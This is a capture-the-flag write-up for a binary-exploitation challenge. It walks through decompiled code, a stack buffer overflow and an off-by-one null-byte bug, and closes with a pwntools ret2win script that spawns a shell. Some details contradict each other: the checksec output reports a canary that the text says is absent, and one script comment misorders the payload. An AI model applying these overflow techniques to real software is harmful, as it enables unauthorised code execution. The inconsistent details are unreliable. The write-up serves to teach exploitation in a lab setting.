### Challenge info:

We were given 1 file:
```c
ipv4
```
File info:
```c
└─$ file ipv4       
ipv4: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=1880e686065a632ed42dd8d93ef6827a44813c91, for GNU/Linux 4.4.0, not stripped
```
```c
└─$ checksec --file=ipv4  
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   2326 Symbols         No    0               0               ipv4    
```
* `No PIE`: binary addresses are fixed

Analyzing the decompiled code from Ghidra:

`main()`:
```c
undefined8 main(void)
{
  int true;
  undefined1 dst_ip [48];
  undefined8 def_ip [6];
  undefined1 src_ip [48];
  undefined8 ip;
  
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  setvbuf((FILE *)stdin,(char *)0x0,2,0);
  setvbuf((FILE *)stderr,(char *)0x0,2,0);
  puts("IPv8 is the future! As someone with an ipv4 address, luckily ipv8 is backwards compatible!")
  ;
  puts("What is your Source ASN Prefix?");
  printf("> ");
  scanf(&%s);
  puts("Sorry, you don\'t get to set that silly! This is for ipv8 only!");
                    /* 0.0.0.0
                        */
  ip = 0x302e302e302e30;      // hex value of "0.0.0.0"
  def_ip[0] = 0x302e302e302e30;
  puts("What is your Source Host Address?");
  printf("> ");
  scanf(&%s,src_ip);    // potential BOF bug
  true = check_valid_address(src_ip);
  if (true != 0) {
    puts("Thats not a valid address!\nHere\'s an ipv8 packet for your reference :3");
    printf(header_format);
    exit(1);
  }
  puts("What is your Destination ASN Prefix?");
  printf("> ");
  scanf(&%s);
  puts("Sorry, you don\'t get to set that silly! This is for ipv8 only!");
  puts("What is your Destination Host Address?");
  printf("> ");
  scanf(&%48s,dst_ip);  // "%48s" - limits to only 48 characters 
  true = check_valid_address(dst_ip);
  if (true != 0) {
    puts("You\'re soo silly, u got your source address right, now tell me where u want to go :3");
    printf(header_format);
    exit(1);
  }
  check_rine(def_ip);
  return 0;
}
```
* We can see there are total of 4 `scanf()` inputs, two of them are useless
* First one, this is clearly a BOF bug
  ```c
  scanf(&%s,src_ip);
  ```
* While, the next one is rather secured
  ```c
  scanf(&%48s,dst_ip);
  ```
* And looking at the initial variables setup:
  ```c
  undefined1 dst_ip [48];
  undefined8 def_ip [6];
  undefined1 src_ip [48];
  undefined8 ip;
  ```
  
  <img width="416" height="216" alt="image" src="https://github.com/user-attachments/assets/4b3ae41e-c6f4-4e6c-87e0-b7beae24dcb3" />

  We can only utilize the BOF to overwrite `ip` and overflow upward to RIP (since no canary implemented in the code)

`check_valid_address()`:
```c
bool check_valid_address(char *ip)

{
  char *finder;
  int octets;
  
  octets = 0;
  for (finder = ip; *finder != '\0'; finder = finder + 1) {
    if (*finder == '.') {
      octets = octets + 1;
    }
  }
  return octets != 3;    // as long as the string has 3 "dots"
}
```
* The check function only check if the IP string we provided contains enough dots, the dots which segments the IP's octets
* We can easily bypass this by putting 3 "." in the input

`check_rine()`:
```c
void check_rine(char *def_ip)

{
  int check;
  
  check = strcmp(def_ip,"0.0.0.0");
  if (check == 0) {
    puts("Sorry, we want devices using ipv8 only...");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  check = strcmp(def_ip,"100.72.7.67");
  if (check == 0) {
    puts("Welcome in our beloved ipv8 address");
    win();      // our target function
  }
  else {
    puts("Wrong RINE address!! Perhaps you were looking for 100.72.7.67");
  }
  return;
}
```
* The final check function is at the end of the program `main()`:
  * if `def_ip` still has its default value of `0.0.0.0` ==> program aborts
  * if `def_ip` has an IP matches with the program's hardcoded IP ==> `win()`
  * else, the function returns back to `main()` 

`win()`:
```c
void win(void)

{
  system("/bin/sh");
  return;
}
```
* If `win()` is called, we have shell spawned
___
### Exploit:
My first instict is we have to modify the value of `def_ip` to the hardcoded value `100.72.7.67`

maybe through BOF, since we did find that bug 

However, the BOF starts at `src_ip`, which is above the variable `def_ip` on the stack. So we cannot reach `def_ip` with BOF.

So move on to the next approach:

* we can still do buffer overflow till RIP, performing `ret2win` technique
  ```c
  puts("What is your Source Host Address?");
  printf("> ");
  scanf(&%s,src_ip);
  ```
* one problem is that the program do a `check_rine(def_ip);` function prior to reaching our RIP in `main()`

  and since we havent changed the initial value of `dst_ip` (still `0.0.0.0`), the program will aborts:
  ```c
  check = strcmp(def_ip,"0.0.0.0");
  if (check == 0) {
    puts("Sorry, we want devices using ipv8 only...");
    exit(1);  /////////// aborts
  }
  ```
  therefore, our modified RIP is never executed
  
* to bypass the check and its exit, we have another bug which is actually not so faraway

  taking a look back at this line:
  ```c
	scanf(&%48s, dst_ip);	
  ```
  although we stated that this line is secured because of its characters limitation (`%48s`) for the 48-byte buffer. However, we recall that in C, strings are null-terminated. This means when scanf finished reading 48 bytes of input, it will automatically appends a **null** at the end of the string. So it actually reads 49 bytes to memory instead of 48.

  by sending full 48 bytes to `dst_ip`, the 49th byte of the input (which is null byte) will overflow to the next memory of `def_ip`. As we remember, `def_ip` is right next to `dst_ip` on the stack. And since the value inside `def_ip` is changed. And when `check_rine()` check, it falls into the `else` case, which prints something and returns to `main()`. Then our `main()` returns as well, but instead calling to our `win()`. 
	
  And that is the bug, called `Off-by-one Null-byte`.

* Here are some debugging images from gdb-pwndbg:

  before any inputs:
  
  <img width="809" height="631" alt="image" src="https://github.com/user-attachments/assets/24e062a6-2eec-4b50-b713-72f8eb147ed4" />

  BOF to RIP:

  <img width="804" height="408" alt="image" src="https://github.com/user-attachments/assets/32eea583-95ac-460a-ac6a-9865d3231553" />

  null-byte overflow:

  <img width="805" height="361" alt="image" src="https://github.com/user-attachments/assets/7d1dfdd7-f6a1-4c24-aaf3-7dda22b90567" />

  obtain shell:

  <img width="805" height="283" alt="image" src="https://github.com/user-attachments/assets/88615251-79d2-4f5b-a1c6-b42b5536c692" />

___
Script: `script.py`
```python
from pwn import *

context.binary = exe = ELF("./ipv4", checksec=False)
context.log_level = "debug"

def GDB():
	gdb.attach(p, gdbscript='''
		br main
		br *main + 282
		br *main + 481
		br *main + 545
		''')


p = process(exe.path)
GDB()

p.sendlineafter(b"> ", b"A")

ret = p64(0x40101a)
win = p64(0x402f45)
payload = ret + win

# bypass the validate() with 3 dots, plus enough padding till RIP. T
# then we have win() at RIP, followed by ret for stack alignment
p.sendlineafter(b"> ", b"." * 3 + b"A"*(104-3) + payload)

p.sendlineafter(b"> ", b"A")

# bypass again, and padding.
# The program will automatically add null byte at the end 
p.sendlineafter(b"> ", b"." * 3 + b"A"  * (48-3))

p.interactive()
```


___
